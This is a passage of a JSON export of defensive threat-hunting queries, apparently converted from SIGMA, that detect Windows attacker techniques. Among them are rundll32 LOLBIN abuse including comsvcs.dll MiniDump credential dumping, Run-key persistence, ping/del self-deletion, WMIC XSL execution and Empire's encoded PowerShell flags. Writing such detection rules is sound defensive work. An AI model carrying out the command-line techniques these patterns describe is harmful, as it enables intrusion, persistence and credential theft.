            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"/generic:Microsoft_Windows_Shell_ZipFolder:filename=\" and tgt.process.cmdline contains \".zip\" and tgt.process.cmdline contains \"/pass:\" and tgt.process.cmdline contains \"/user:\") or (tgt.process.cmdline contains \"/delete\" and tgt.process.cmdline contains \"Microsoft_Windows_Shell_ZipFolder:filename=\" and tgt.process.cmdline contains \".zip\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1063
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious child processes of \"Diskshadow.exe\". This could be an attempt to bypass parent/child relationship detection or application whitelisting rules.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potentially Suspicious Child Process Of DiskShadow.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\diskshadow.exe\" and (tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\wscript.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1064
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of Tor or Tor-Browser to connect to onion routing networks",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1090"
            ],
            "name": "Tor Client/Browser Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\tor.exe\" or tgt.process.image.path contains \"\\Tor Browser\\Browser\\firefox.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1065
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious child processes of \"GoogleUpdate.exe\"",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potentially Suspicious GoogleUpdate Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\GoogleUpdate.exe\" and (not ((tgt.process.image.path contains \"\\Google\" or (tgt.process.image.path contains \"\\setup.exe\" or tgt.process.image.path contains \"chrome_updater.exe\" or tgt.process.image.path contains \"chrome_installer.exe\")) or not (tgt.process.image.path matches \"\\.*\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1066
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Microsoft Visual Studio vsls-agent.exe lolbin execution with a suspicious library load using the --agentExtensionPath parameter",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Suspicious Vsls-Agent Command With AgentExtensionPath Load",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\vsls-agent.exe\" and tgt.process.cmdline contains \"--agentExtensionPath\") and (not tgt.process.cmdline contains \"Microsoft.VisualStudio.LiveShare.Agent.\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1067
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious process command line that uses whoami as first parameter (as e.g. used by EfsPotato)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1033"
            ],
            "name": "WhoAmI as Parameter",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \".exe whoami\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1068
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects creation of a new service (kernel driver) with the type \"kernel\"",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1543"
            ],
            "name": "New Kernel Driver Via SC.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\sc.exe\" and (tgt.process.cmdline contains \"create\" or tgt.process.cmdline contains \"config\") and (tgt.process.cmdline contains \"binPath\" and tgt.process.cmdline contains \"type\" and tgt.process.cmdline contains \"kernel\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1069
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of \"aspnet_compiler.exe\" with potentially suspicious paths for compilation.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1127"
            ],
            "name": "Potentially Suspicious ASP.NET Compilation Via AspNetCompiler",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"C:\\Windows\\Microsoft.NET\\Framework\\\" or tgt.process.image.path contains \"C:\\Windows\\Microsoft.NET\\Framework64\\\") and tgt.process.image.path contains \"\\aspnet_compiler.exe\" and (tgt.process.cmdline contains \"\\Users\\Public\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\Roaming\\\" or tgt.process.cmdline contains \":\\Temp\\\" or tgt.process.cmdline contains \":\\Windows\\Temp\\\" or tgt.process.cmdline contains \":\\Windows\\System32\\Tasks\\\" or tgt.process.cmdline contains \":\\Windows\\Tasks\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1070
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a method often used by ransomware. Which combines the \"ping\" to wait a couple of seconds and then \"del\" to delete the file in question. Its used to hide the file responsible for the initial infection for example",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1070"
            ],
            "name": "Suspicious Ping/Del Command Combination",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" -n \" or tgt.process.cmdline contains \" /n \" or tgt.process.cmdline contains \" \u2013n \" or tgt.process.cmdline contains \" \u2014n \" or tgt.process.cmdline contains \" \u2015n \") and tgt.process.cmdline contains \"Nul\" and (tgt.process.cmdline contains \" -f \" or tgt.process.cmdline contains \" /f \" or tgt.process.cmdline contains \" \u2013f \" or tgt.process.cmdline contains \" \u2014f \" or tgt.process.cmdline contains \" \u2015f \" or tgt.process.cmdline contains \" -q \" or tgt.process.cmdline contains \" /q \" or tgt.process.cmdline contains \" \u2013q \" or tgt.process.cmdline contains \" \u2014q \" or tgt.process.cmdline contains \" \u2015q \") and (tgt.process.cmdline contains \"ping\" and tgt.process.cmdline contains \"del \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1071
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of WMIC with the \"format\" flag to potentially load XSL files.\nAdversaries abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.\nExtensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1220"
            ],
            "name": "XSL Script Execution Via WMIC.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\wmic.exe\" and (tgt.process.cmdline contains \"-format\" or tgt.process.cmdline contains \"/format\" or tgt.process.cmdline contains \"\u2013format\" or tgt.process.cmdline contains \"\u2014format\" or tgt.process.cmdline contains \"\u2015format\")) and (not (tgt.process.cmdline contains \"Format:List\" or tgt.process.cmdline contains \"Format:htable\" or tgt.process.cmdline contains \"Format:hform\" or tgt.process.cmdline contains \"Format:table\" or tgt.process.cmdline contains \"Format:mof\" or tgt.process.cmdline contains \"Format:value\" or tgt.process.cmdline contains \"Format:rawxml\" or tgt.process.cmdline contains \"Format:xml\" or tgt.process.cmdline contains \"Format:csv\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1072
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious command line reg.exe tool adding key to RUN key in Registry",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1547"
            ],
            "name": "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"reg\" and tgt.process.cmdline contains \" ADD \" and tgt.process.cmdline contains \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1073
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious execution of rundll32, with specific calls to some DLLs with known LOLBIN functionalities",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potentially Suspicious Rundll32 Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"javascript:\" and tgt.process.cmdline contains \".RegisterXLL\") or (tgt.process.cmdline contains \"url.dll\" and tgt.process.cmdline contains \"OpenURL\") or (tgt.process.cmdline contains \"url.dll\" and tgt.process.cmdline contains \"OpenURLA\") or (tgt.process.cmdline contains \"url.dll\" and tgt.process.cmdline contains \"FileProtocolHandler\") or (tgt.process.cmdline contains \"zipfldr.dll\" and tgt.process.cmdline contains \"RouteTheCall\") or (tgt.process.cmdline contains \"shell32.dll\" and tgt.process.cmdline contains \"Control_RunDLL\") or (tgt.process.cmdline contains \"shell32.dll\" and tgt.process.cmdline contains \"ShellExec_RunDLL\") or (tgt.process.cmdline contains \"mshtml.dll\" and tgt.process.cmdline contains \"PrintHTML\") or (tgt.process.cmdline contains \"advpack.dll\" and tgt.process.cmdline contains \"LaunchINFSection\") or (tgt.process.cmdline contains \"advpack.dll\" and tgt.process.cmdline contains \"RegisterOCX\") or (tgt.process.cmdline contains \"ieadvpack.dll\" and tgt.process.cmdline contains \"LaunchINFSection\") or (tgt.process.cmdline contains \"ieadvpack.dll\" and tgt.process.cmdline contains \"RegisterOCX\") or (tgt.process.cmdline contains \"ieframe.dll\" and tgt.process.cmdline contains \"OpenURL\") or (tgt.process.cmdline contains \"shdocvw.dll\" and tgt.process.cmdline contains \"OpenURL\") or (tgt.process.cmdline contains \"syssetup.dll\" and tgt.process.cmdline contains \"SetupInfObjectInstallAction\") or (tgt.process.cmdline contains \"setupapi.dll\" and tgt.process.cmdline contains \"InstallHinfSection\") or (tgt.process.cmdline contains \"pcwutl.dll\" and tgt.process.cmdline contains \"LaunchApplication\") or (tgt.process.cmdline contains \"dfshim.dll\" and tgt.process.cmdline contains \"ShOpenVerbApplication\") or (tgt.process.cmdline contains \"dfshim.dll\" and tgt.process.cmdline contains \"ShOpenVerbShortcut\") or (tgt.process.cmdline contains \"scrobj.dll\" and tgt.process.cmdline contains \"GenerateTypeLib\" and tgt.process.cmdline contains \"http\") or (tgt.process.cmdline contains \"shimgvw.dll\" and tgt.process.cmdline contains \"ImageView_Fullscreen\" and tgt.process.cmdline contains \"http\") or (tgt.process.cmdline contains \"comsvcs.dll\" and tgt.process.cmdline contains \"MiniDump\")) and (not (tgt.process.cmdline contains \"shell32.dll,Control_RunDLL desk.cpl,screensaver,@screensaver\" or (src.process.image.path=\"C:\\Windows\\System32\\control.exe\" and src.process.cmdline contains \".cpl\" and (tgt.process.cmdline contains \"Shell32.dll\" and tgt.process.cmdline contains \"Control_RunDLL\" and tgt.process.cmdline contains \".cpl\")) or (src.process.image.path=\"C:\\Windows\\System32\\control.exe\" and tgt.process.cmdline contains \"\\\"C:\\Windows\\system32\\rundll32.exe\\\" Shell32.dll,Control_RunDLL \\\"C:\\Windows\\System32\\\" and tgt.process.cmdline contains \".cpl\\\",\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1074
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of a Windows system binary that is usually located in the system folder from an uncommon location.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "System File Execution Location Anomaly",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\atbroker.exe\" or tgt.process.image.path contains \"\\audiodg.exe\" or tgt.process.image.path contains \"\\bcdedit.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\certreq.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cmstp.exe\" or tgt.process.image.path contains \"\\conhost.exe\" or tgt.process.image.path contains \"\\consent.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\csrss.exe\" or tgt.process.image.path contains \"\\dashost.exe\" or tgt.process.image.path contains \"\\defrag.exe\" or tgt.process.image.path contains \"\\dfrgui.exe\" or tgt.process.image.path contains \"\\dism.exe\" or tgt.process.image.path contains \"\\dllhost.exe\" or tgt.process.image.path contains \"\\dllhst3g.exe\" or tgt.process.image.path contains \"\\dwm.exe\" or tgt.process.image.path contains \"\\eventvwr.exe\" or tgt.process.image.path contains \"\\logonui.exe\" or tgt.process.image.path contains \"\\LsaIso.exe\" or tgt.process.image.path contains \"\\lsass.exe\" or tgt.process.image.path contains \"\\lsm.exe\" or tgt.process.image.path contains \"\\msiexec.exe\" or tgt.process.image.path contains \"\\ntoskrnl.exe\" or tgt.process.image.path contains \"\\powershell_ise.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\runonce.exe\" or tgt.process.image.path contains \"\\RuntimeBroker.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\services.exe\" or tgt.process.image.path contains \"\\sihost.exe\" or tgt.process.image.path contains \"\\smartscreen.exe\" or tgt.process.image.path contains \"\\smss.exe\" or tgt.process.image.path contains \"\\spoolsv.exe\" or tgt.process.image.path contains \"\\svchost.exe\" or tgt.process.image.path contains \"\\taskhost.exe\" or tgt.process.image.path contains \"\\Taskmgr.exe\" or tgt.process.image.path contains \"\\userinit.exe\" or tgt.process.image.path contains \"\\wininit.exe\" or tgt.process.image.path contains \"\\winlogon.exe\" or tgt.process.image.path contains \"\\winver.exe\" or tgt.process.image.path contains \"\\wlanext.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\wsl.exe\" or tgt.process.image.path contains \"\\wsmprovhost.exe\") and (not ((tgt.process.image.path contains \"C:\\$WINDOWS.~BT\\\" or tgt.process.image.path contains \"C:\\$WinREAgent\\\" or tgt.process.image.path contains \"C:\\Windows\\SoftwareDistribution\\\" or tgt.process.image.path contains \"C:\\Windows\\System32\\\" or tgt.process.image.path contains \"C:\\Windows\\SystemTemp\\\" or tgt.process.image.path contains \"C:\\Windows\\SysWOW64\\\" or tgt.process.image.path contains \"C:\\Windows\\uus\\\" or tgt.process.image.path contains \"C:\\Windows\\WinSxS\\\") or (tgt.process.image.path in (\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\",\"C:\\Program Files\\PowerShell\\7-preview\\pwsh.exe\")) or (tgt.process.image.path contains \"C:\\Program Files\\WindowsApps\\MicrosoftCorporationII.WindowsSubsystemForLinux\" and tgt.process.image.path contains \"\\wsl.exe\"))) and (not tgt.process.image.path contains \"\\SystemRoot\\System32\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1075
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious powershell command line parameters used in Empire",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "HackTool - Empire PowerShell Launch Parameters",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" -NoP -sta -NonI -W Hidden -Enc \" or tgt.process.cmdline contains \" -noP -sta -w 1 -enc \" or tgt.process.cmdline contains \" -NoP -NonI -W Hidden -enc \" or tgt.process.cmdline contains \" -noP -sta -w 1 -enc\" or tgt.process.cmdline contains \" -enc  SQB\" or tgt.process.cmdline contains \" -nop -exec bypass -EncodedCommand \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1076
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
